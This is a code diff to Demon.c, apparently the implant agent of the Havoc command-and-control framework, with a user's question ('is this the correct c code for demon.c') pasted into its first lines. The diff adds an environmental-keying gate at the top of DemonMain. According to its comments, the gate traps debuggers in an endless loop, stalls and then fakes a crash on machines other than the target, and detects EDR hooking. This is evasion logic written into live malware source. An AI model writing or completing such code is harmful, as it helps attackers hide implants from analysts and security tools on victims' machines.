@@ -1,3 +1,5 @@
+i am in step 2 
+is this the correct c code for demon.c
 #include <Demon.h>
 
 /* Import Common Headers */
@@ -18,6 +20,9 @@
 /* Import Inject Headers */
 #include <core/ObjectApi.h>
 
+/* Gate 1: Environmental Keying */
+#include "EnvironmentalKeying.h"
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
@@ -25,6 +30,7 @@ SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
 /*
  * In DemonMain it should go as followed:
  *
+ * 0. Gate 1: Environmental Keying (Identity Check)
  * 1. Initialize pointer, modules and win32 api
  * 2. Initialize metadata
  * 3. Parse config
@@ -33,6 +39,21 @@ SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
  */
 VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
 {
+    // =============================================
+    // GATE 1: ENVIRONMENTAL KEYING
+    // =============================================
+    // This checks if the agent is running on the correct target machine.
+    // If the identity doesn't match, the agent will:
+    //   1. Enter infinite zombie loop (if debugger detected)
+    //   2. Stall for 3 minutes then fake crash (if wrong machine)
+    //   3. Detect EDR hooking and fail gracefully
+    // =============================================
+    if (!Gate1_Identity_Check()) {
+        // Should never reach here - GracefulFailure already called
+        return;
+    }
+    // =============================================
+
     INSTANCE Inst = { 0 };
 
     /* "allocate" instance on stack */
